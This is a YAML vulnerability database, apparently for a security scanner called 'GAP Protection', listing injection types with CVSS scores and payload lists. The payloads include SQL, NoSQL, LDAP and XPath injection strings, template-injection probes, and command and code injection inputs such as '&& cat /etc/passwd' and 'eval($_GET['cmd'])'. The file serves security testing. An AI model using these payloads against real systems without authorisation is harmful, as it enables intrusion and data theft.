# GAP Protection - Ultimate Vulnerability Database
# 300+ Vulnerability Types with Comprehensive Payloads

vulnerabilities:
  # =============================================================================
  # 1. INJECTION VULNERABILITIES
  # =============================================================================
  
  - id: "sqli-union-001"
    name: "SQL Injection - Union Based"
    category: "injection"
    type: "sql_injection"
    severity: "CRITICAL"
    cvss: 9.8
    payloads:
      - "' UNION SELECT NULL,NULL,NULL--"
      - "' UNION SELECT 1,2,3,4,5--"
      - "' UNION SELECT user(),database(),version()--"
      - "' UNION SELECT table_name FROM information_schema.tables--"
      - "' UNION SELECT column_name FROM information_schema.columns--"
  
  - id: "sqli-blind-002"
    name: "SQL Injection - Blind Boolean"
    category: "injection"
    type: "sql_injection"
    severity: "CRITICAL"
    cvss: 9.8
    payloads:
      - "' AND 1=1--"
      - "' AND 1=2--"
      - "' AND (SELECT COUNT(*) FROM users)>0--"
      - "' AND LENGTH(database())>5--"
      - "' AND ASCII(SUBSTRING(database(),1,1))>64--"
  
  - id: "sqli-time-003"
    name: "SQL Injection - Time Based"
    category: "injection"
    type: "sql_injection"
    severity: "CRITICAL"
    cvss: 9.8
    payloads:
      - "' AND SLEEP(5)--"
      - "' OR IF(1=1,SLEEP(5),0)--"
      - "'; WAITFOR DELAY '00:00:05'--"
      - "' AND BENCHMARK(5000000,MD5('test'))--"
  
  - id: "nosql-001"
    name: "NoSQL Injection - MongoDB"
    category: "injection"
    type: "nosql_injection"
    severity: "CRITICAL"
    cvss: 9.5
    payloads:
      - "{'$gt': ''}"
      - "{'$ne': null}"
      - "{'$where': 'sleep(5000)'}"
      - "admin'||'1'=='1"
      - "{'$regex': '^.*'}"
  
  - id: "cmd-injection-001"
    name: "OS Command Injection"
    category: "injection"
    type: "command_injection"
    severity: "CRITICAL"
    cvss: 10.0
    payloads:
      - "; ls -la"
      - "| whoami"
      - "&& cat /etc/passwd"
      - "`id`"
      - "$(whoami)"
      - "; ping -c 10 127.0.0.1"
  
  - id: "code-injection-001"
    name: "Code Injection"
    category: "injection"
    type: "code_injection"
    severity: "CRITICAL"
    cvss: 9.8
    payloads:
      - "system('whoami');"
      - "eval($_GET['cmd'])"
      - "__import__('os').system('id')"
      - "Runtime.getRuntime().exec('whoami')"
  
  - id: "ssti-001"
    name: "Server-Side Template Injection"
    category: "injection"
    type: "template_injection"
    severity: "CRITICAL"
    cvss: 9.0
    payloads:
      - "{{7*7}}"
      - "{{config.items()}}"
      - "${7*7}"
      - "#{7*7}"
      - "<%= 7*7 %>"
      - "{{''.__class__.__mro__[1].__subclasses__()}}"
  
  - id: "ldap-injection-001"
    name: "LDAP Injection"
    category: "injection"
    type: "ldap_injection"
    severity: "HIGH"
    cvss: 8.1
    payloads:
      - "*"
      - "admin*"
      - "*)(&(objectClass=*"
      - "*)(uid=*))(|(uid=*"
  
  - id: "xpath-injection-001"
    name: "XPath Injection"
    category: "injection"
    type: "xpath_injection"
    severity: "HIGH"
    cvss: 8.0
    payloads:
      - "' or '1'='1"
      - "' or ''='"
      - "x' or 1=1 or 'x'='y"
      - "//user[name/text()='' or '1'='1']"
  
